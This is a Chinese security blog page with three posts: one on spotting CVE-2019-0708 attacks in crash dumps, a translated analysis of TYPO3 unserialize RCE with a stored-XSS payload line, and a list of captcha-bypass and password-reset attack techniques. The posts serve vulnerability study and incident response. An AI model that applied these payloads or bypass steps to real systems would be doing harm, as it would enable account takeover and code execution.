<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>ALL BLUE</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="ALL BLUE">
<meta property="og:url" content="http://allblue147.github.io/page/2/index.html">
<meta property="og:site_name" content="ALL BLUE">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ALL BLUE">
  
    <link rel="alternative" href="/atom.xml" title="ALL BLUE" type="application/atom+xml">
  
  
    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
        <a href="/" class="profilepic">
            
            <img lazy-src="img/head.jpg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">JYP</a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="http://bestwing.me">博客首页</a></li>
                        
                            <li><a href="/archives">文章归档</a></li>
                        
                            <li><a href="/CTFStudy">学习导航</a></li>
                        
                            <li><a href="/PWNABLE">PWNABLE</a></li>
                        
                            <li><a href="/resume">个人简历</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
                            
                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
                            
                                <a class="fl weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                            
                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://ring3.xyz/">Yllen</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">K0sh1</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/">信鑫</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://bystudent.com/">ByStundet表哥</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/">汪神_Jarvis</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://sh3ll.me/">Chu</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy">L3m0n</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/">muhe</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/">_画船听雨</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html">Virink</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/">国光</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/">老锥</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cizel.cn/">C1zel</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://1phan.cc">1phan</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.liuil.top/">liuil</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://burnegg.com/">burnegg</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://jwrsec.cn/">jwr-sec</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://sudalover.cn/">苏打</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.binklac.com">VeroFess</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.bendawang.site/">bendawang</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/">hook</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.flier.net.cn/">Flier&#39;blog</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.mutepig.club">mutepig</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.iret.xyz/list.aspx">Silver</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://simp1e.leanote.com/">Simple</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://processor.pub/">Processor</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">一只淹死在二进制海洋里的二进制狗</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">JYP</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/head.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">JYP</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="http://bestwing.me">博客首页</a></li>
                
                    <li><a href="/archives">文章归档</a></li>
                
                    <li><a href="/CTFStudy">学习导航</a></li>
                
                    <li><a href="/PWNABLE">PWNABLE</a></li>
                
                    <li><a href="/resume">个人简历</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
                    
                        <a class="weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-漏洞搜集/cve-20190-0708" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/漏洞搜集/cve-20190-0708/" class="article-date">
      <time datetime="2019-12-06T17:03:10.525Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/漏洞搜集/cve-20190-0708/">简单判断是否是cve-2019-0708攻击</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>文章转自<a href="https://mp.weixin.qq.com/s?__biz=MzA4NjQxMDcxNA==&amp;mid=2709352684&amp;idx=1&amp;sn=0e845ce5ee2c7f210d89e1566b39e0e5" title="中国白客联盟" target="_blank" rel="noopener">中国白客联盟</a></p>
<hr>
<p>今早一起床，发现cve-2019-0708 exp已经公开。但是作为安服人员，攻击是一回事，应急又是另一大回事。这里就简单来判断受害者机器是否受到了cve-2019-0708攻击。</p>
<p>因为cve-2019-0708这类是溢出类攻击，所以跟ms17-010、ms12-020一样，有一定的几率把机器打蓝屏，这里以蓝屏文件为例作为分析。</p>
<p>首先安装windbg，添加符号表<br><img src="https://tva1.sinaimg.cn/large/005R6Otmly1g6tf36icqcj30nd08mq53.jpg" alt><br><code>set _NT_SYMBOL_PATH=srv*DownstreamStore*https://msdl.microsoft.com/download/symbols</code><br>打开蓝屏文件，我的win7默认在<br><code>C:\Windows\Minidump</code></p>
<p>首先我利用cve-2019-0708把我机器打蓝屏，打开该蓝屏dmp文件，关注debug session time、system uptime，可以看到该机器运行了4分钟，在10:00左右出现蓝屏事件：<br><img src="https://ws3.sinaimg.cn/large/005R6Otmly1g6tf36pi9wj30mu05g767.jpg" alt><br>输入</p>
<p><code>!analyze -v</code><br>看到蓝屏代码<br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf36v2gpj30o302y0tc.jpg" alt><br>蓝屏代码造成原因：</p>
<p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37055uj30mn01kt90.jpg" alt></p>
<p>关注PROCESS_NAME，代表导致系统蓝屏的进程：</p>
<p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37fasyj30nh05vwfy.jpg" alt></p>
<p>FOLLOWUP_IP，错误指令位置</p>
<p><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf37md3jj30o704faas.jpg" alt></p>
<p>查看出错驱动，rdpwd.sys，可以通过网上搜索对应漏洞分析文章，查看对用的驱动是否受影响<br><code>lmvm RDPWD</code><br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38grlmj30ns07mq6d.jpg" alt></p>
<p>这是ms12-020打的</p>
<p><img src="https://ws1.sinaimg.cn/large/005R6Otmly1g6tf38ol3sj30n9024wfc.jpg" alt></p>
<p>这是ms17-010打的<br><img src="https://ws4.sinaimg.cn/large/005R6Otmly1g6tf38vddfj30mx05ygmg.jpg" alt></p>
<p>可见不同的攻击手法得到的蓝屏文件结果不一样的，因此可以通过分析蓝屏文件来判断是否受到了哪种攻击。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-漏洞搜集/CVE-2019-12747：TYPO3 9.5.7 RCE漏洞分析" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/漏洞搜集/CVE-2019-12747：TYPO3 9.5.7 RCE漏洞分析/" class="article-date">
      <time datetime="2019-12-06T17:03:10.521Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/漏洞搜集/CVE-2019-12747：TYPO3 9.5.7 RCE漏洞分析/">CVE-2019-12747：TYPO3 9.5.7 RCE漏洞分析</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><strong>译文声明:<br>本文是翻译文章，文章原作者ripstech，文章来源：blog.ripstech.com<br>原文地址：<a href="https://blog.ripstech.com/2019/typo3-overriding-the-database" target="_blank" rel="noopener">https://blog.ripstech.com/2019/typo3-overriding-the-database</a><br>译文仅供参考，具体内容表达以及含义原文为准</strong><br><img src="https://p2.ssl.qhimg.com/t01cb51d1cb54b0010f.png" alt></p>
<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>在本文中，我们研究TYPO3 CMS的核心中的一个关键漏洞，该漏洞通过代码审计挖掘而出。该漏洞使得经过身份验证的用户能够在底层系统上执行任意PHP代码。</p>
<p>受该漏洞影响的版本是TYPO3 8.x到8.7.26，以及TYPO3 9.x到9.5.7。对不可信数据的反序列化会导致远程代码执行漏洞，该漏洞可以与后端中检测到的跨站脚本漏洞(CVE-2019-12748)相结合。</p>
<p>RIP扫描报告（<a href="https://demo.ripstech.com/scan/109/165）" target="_blank" rel="noopener">https://demo.ripstech.com/scan/109/165）</a></p>
<h2 id="0x02-使用payload覆盖数据库"><a href="#0x02-使用payload覆盖数据库" class="headerlink" title="0x02 使用payload覆盖数据库"></a>0x02 使用payload覆盖数据库</h2><p>在TYPO3的后端部分保存任何表单时将会发生此漏洞。例如，如果用户修改了pages部分，则可以从TYPO3的SQL数据库中提取要编辑的数据并将其写回数据库。在从数据库获取数据之后，应用逻辑允许通过用户的输入覆盖所获取数据的单列。此特征允许经过身份验证的恶意后端用户覆盖包含序列化数据的数据库值，这些数据稍后会反序列化。这将会导致PHP对象注入，最终攻击者可以远程执行代码（CVE-2019-12747）。</p>
<p>攻击视频（<a href="https://blog.ripstech.com/videos/typo3_957.mp4）" target="_blank" rel="noopener">https://blog.ripstech.com/videos/typo3_957.mp4）</a></p>
<h2 id="0x03-技术细节"><a href="#0x03-技术细节" class="headerlink" title="0x03 技术细节"></a>0x03 技术细节</h2><p>在TYPO3中保存后端表单时，将调用$formDataCompiler对象的compile()方法。参数是一个使用用户输入填充的数组，如下第8行所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Controller/EditDocumentController.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">  $this-&gt;overrideVals = $parsedBody[&apos;overrideVals&apos;] ?? </span><br><span class="line">    $queryParams[&apos;overrideVals&apos;] ?? null;</span><br><span class="line">  // ... </span><br><span class="line">  $formDataCompilerInput[&apos;overrideValues&apos;] = $this-&gt;overrideVals[$table];</span><br><span class="line">  $formData = $formDataCompiler-&gt;compile($formDataCompilerInput);</span><br></pre></td></tr></table></figure>
<p>该方法使用for-loop遍历一个有序的FormDataProvider对象列表，并按顺序在每个$provider对象上调用addData()方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Form/FormDataGroup/OrderedProviderList.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">public function compile(array $result): array</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  foreach ($orderedDataProvider as $providerClassName =&gt; $providerConfig) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    $result = $provider-&gt;addData($result);</span><br><span class="line">  &#125;</span><br><span class="line">  return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上代码的第9行，$provider-&gt;addData()的参数$result在下面的addData()方法调用作为其参数。在每次迭代时，变量$result表示数组在$provider处理完其内容后被修改。其中一个providers是DatabaseRecordOverrideValues类的一个实例，该类允许覆盖从数组$result中提取的数据，其中数组的行列值分别为databaseRow和任意key值。</p>
<p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseRecordOverrideValues.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($result[&apos;overrideValues&apos;] as $fieldName =&gt; $fieldValue) &#123;</span><br><span class="line">        if (isset($result[&apos;processedTca&apos;][&apos;columns&apos;][$fieldName])) &#123;</span><br><span class="line">            $result[&apos;databaseRow&apos;][$fieldName] = $fieldValue;</span><br><span class="line">            // ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，下列FormDataProvider对象之一实现了unserialize()方法对被覆盖数据的调用，从而导致漏洞：</p>
<p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseLanguageRows.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  if (/*...*/) </span><br><span class="line">  &#123;</span><br><span class="line">    $result[&apos;defaultLanguageDiffRow&apos;][$defaultLanguageKey] = unserialize(</span><br><span class="line">        $result[&apos;databaseRow&apos;][$result[&apos;processedTca&apos;][&apos;ctrl&apos;]</span><br><span class="line">        [&apos;transOrigDiffSourceField&apos;]]);</span><br></pre></td></tr></table></figure></p>
<p>这里是有关如何通过工具链expoit PHP对象注入的更多信息的链接： （<a href="https://blog.ripstech.com/2018/php-object-injection）" target="_blank" rel="noopener">https://blog.ripstech.com/2018/php-object-injection）</a></p>
<h2 id="0x04-CVE-2019-12748：在后端的存储型XSS"><a href="#0x04-CVE-2019-12748：在后端的存储型XSS" class="headerlink" title="0x04 CVE-2019-12748：在后端的存储型XSS"></a>0x04 CVE-2019-12748：在后端的存储型XSS</h2><p>CMS TYPO3的后端中存在跨站脚本漏洞（CVE-2019-12748）。有权访问Site Redirects部分的非特权用户可以利用t3://伪协议注入一个恶意的URL。<br><code>t3://url/?url=javascript:alert(1);</code><br>通过添加这个特定的站点，可以重定向另一个拥有更高权限的TYPO3用户，从而诱使他们点击触发恶意JavaScript的链接。攻击者可以将此漏洞作为启动远程代码执行漏洞攻击的支点。</p>
<p>TYPO3会阻止用户利用链接和URL中危险的javascript:伪协议，这意味着TYPO3将直接执行JavaScript。但是，它并不阻止用户利用TYPO3的内置t3://伪协议，该协议实现了多种功能，例如引用TYPO3内部页面，文件，邮件地址或URLs。实际上，指定一个自动转换为可点击链接的URL将绕过TYPO3的白名单，该白名单最初的作用是阻止javascript:伪协议。</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>本文所述的漏洞会对具有一个或多个TYPO3后端的用户的TYPO3系统产生严重的影响。经过身份验证并且可以访问Pages部分的后端用户可以在底层远程系统上执行代码。攻击者可以利用Site Redirects模块中的跨站脚本漏洞作为利用此漏洞的支点。</p>
<h2 id="0x06-时间线"><a href="#0x06-时间线" class="headerlink" title="0x06 时间线"></a>0x06 时间线</h2><p>2019年5月9日：提交漏洞<br>2019年5月9日：漏洞确认<br>2019年5月10日：与厂商安全负责人协调解决问题<br>2019年6月6日：厂商通知6月25号发布补丁<br>2019年6月25日：TYPO3 9.5.8补丁发布</p>
<h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><p>WordPress 5.1 CSRF to Remote Code Execution：</p>
<p><a href="https://blog.ripstech.com/2019/wordpress-csrf-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-csrf-to-rce</a></p>
<p>Magento 2.3.1: Unauthenticated Stored XSS to RCE：</p>
<p><a href="https://blog.ripstech.com/2019/magento-rce-via-xss" target="_blank" rel="noopener">https://blog.ripstech.com/2019/magento-rce-via-xss</a></p>
<p>MyBB &lt;= 1.8.20: From Stored XSS to RCE：</p>
<p><a href="https://blog.ripstech.com/2019/mybb-stored-xss-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/mybb-stored-xss-to-rce</a></p>
<p>WordPress 5.0.0 Remote Code Execution：</p>
<p><a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution</a></p>
<p>CTF Writeup: Complex Drupal POP Chain：</p>
<p><a href="https://blog.ripstech.com/2019/complex-drupal-pop-chain" target="_blank" rel="noopener">https://blog.ripstech.com/2019/complex-drupal-pop-chain</a></p>
<p>本文翻译自 blog.ripstech.com， 原文链接 。如若转载请注明出处。</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-验证码绕过、密码找回漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/验证码绕过、密码找回漏洞/" class="article-date">
      <time datetime="2019-12-06T17:03:10.514Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/验证码绕过、密码找回漏洞/">验证码绕过、密码找回漏洞</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="验证码作用"><a href="#验证码作用" class="headerlink" title="验证码作用"></a>验证码作用</h2><p>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。</p>
<p>可以防止：恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。这个问题可以由计算机生成并评判，但是必须只有人类才能解答。</p>
<p>由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</p>
<p>验证码的种类很多，有滑块验证，纯数字验证，点击字符，数字运算等……<br>而我们能有效的利用验证码防止恶意破解密码、刷票、论坛灌水、刷页。</p>
<h2 id="验证码常见的绕过姿势"><a href="#验证码常见的绕过姿势" class="headerlink" title="验证码常见的绕过姿势"></a>验证码常见的绕过姿势</h2><h3 id="验证码不失效"><a href="#验证码不失效" class="headerlink" title="验证码不失效"></a>验证码不失效</h3><ul>
<li>造成原因：找回密码的时候获取的验证码缺少时间限制仅值判断了验证码是够正确未判断验证码是否过期。</li>
<li>测试方法：通过枚举找到真正的验证码输入验证码完成验证。</li>
</ul>
<p>###验证码重复使用<br>验证码可以多次重复，如果现在的验证码为1106，如果登录失了，验证码会换但是输入1106，还是判定验证码正确；<a href="http://www.anquan.us/static/bugs/wooyun-2016-0169672.html" target="_blank" rel="noopener">案例</a></p>
<h3 id="未校验用户字段的值"><a href="#未校验用户字段的值" class="headerlink" title="未校验用户字段的值"></a>未校验用户字段的值</h3><ul>
<li>造成原因：在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码。</li>
<li>测试方法：使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。<h3 id="前端验证验证码"><a href="#前端验证验证码" class="headerlink" title="前端验证验证码"></a>前端验证验证码</h3></li>
<li>造成原因：只在前端进行验证没有进行后端验证</li>
<li>测试方法：直接抓包进行跑数据包，反正没验证码的阻碍。<h3 id="修改密码处id可替换"><a href="#修改密码处id可替换" class="headerlink" title="修改密码处id可替换"></a>修改密码处id可替换</h3></li>
<li>造成原因：修改密码的时候，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句：update user set  password=”qwer1234” where id = ‘1’修改数据包里的id的值，即可修改他人密码。</li>
<li>测试方法：修改自己用户密码，抓取数据包，替换数据包中用户对应的id值，即可修改他人的密码。<h3 id="验证码无校验"><a href="#验证码无校验" class="headerlink" title="验证码无校验"></a>验证码无校验</h3></li>
<li>造成原因：设置了验证码，但却没有校验(真是扯淡……估计开发会被老板砍死)</li>
<li>测试方法：乱输验证码进行验证即可。<h3 id="验证码空值绕过"><a href="#验证码空值绕过" class="headerlink" title="验证码空值绕过"></a>验证码空值绕过</h3></li>
<li>造成原因：没对验证码参数进行强制条件，如我们发现登录参数是user=admin&amp;psw=123456&amp;yzm=1312，将验证码传参去掉，留下user=admin&amp;psw=123456就可以绕过验证码机制。</li>
<li>测试方法：抓包，如看到类似验证码参数，将其去掉，进行发包。<h3 id="验证码可控制"><a href="#验证码可控制" class="headerlink" title="验证码可控制"></a>验证码可控制</h3></li>
<li>造成原因：有时候验证码通过url传参，就是说我们参数可控，而验证码是通过参数设定的。</li>
<li>测试方法：直接将参数设置成固定，那么可能验证码就不会变</li>
</ul>
<p><strong>绕过姿势有很多种，这里只是给大家介绍几种，能帮助更好的了解此漏洞。</strong></p>
<h2 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h2><p>有一类验证码，他并不是区分用户是计算机还是人的公共全自动程序，它是用来证明你的身份，比如你登入微信，支付宝，支持短信验证登入，像这类验证码实际上是用来区分你的身份的。<br>当你qq密码忘记密码时候，你需要找回密码，然后他要求把APP现实的动态密码填入框内，一般而言手机验证码都由5-30分钟，如果他没有做尝试限制的话我们是不是可以进行穷举？然后直接跑出验证码就能修改他人的密码？</p>
<p>第一种就是找回密码，往邮箱发送明文或密码后者验证码(手机短信验证就是玩你的手机发送验证码)通过这样的方式来判断是否是本人</p>
<p>第二种发送一个重置密码的链接到你的绑定邮箱去，点击则重置密码；</p>
<h3 id="密码找回漏洞例子"><a href="#密码找回漏洞例子" class="headerlink" title="密码找回漏洞例子"></a>密码找回漏洞例子</h3><ul>
<li>验证码发送后前端返回<a href="http://www.anquan.us/static/bugs/wooyun-2016-0172266.html" target="_blank" rel="noopener">安利</a></li>
<li>验证码无次数限制可爆破</li>
<li>验证码可控<a href="http://www.anquan.us/static/bugs/wooyun-2014-086716.html" target="_blank" rel="noopener">安利</a></li>
<li>直接修改密码页面<a href="http://www.anquan.us/static/bugs/wooyun-2013-040908.html" target="_blank" rel="noopener">安利</a></li>
<li>缺失身份——&gt;绑定别人的手机号到自己的手机<a href="http://www.anquan.us/static/bugs/wooyun-2013-016896.html" target="_blank" rel="noopener">安利</a></li>
<li>越权漏洞——&gt;自己验证码通过改包然后修改他们密码</li>
</ul>
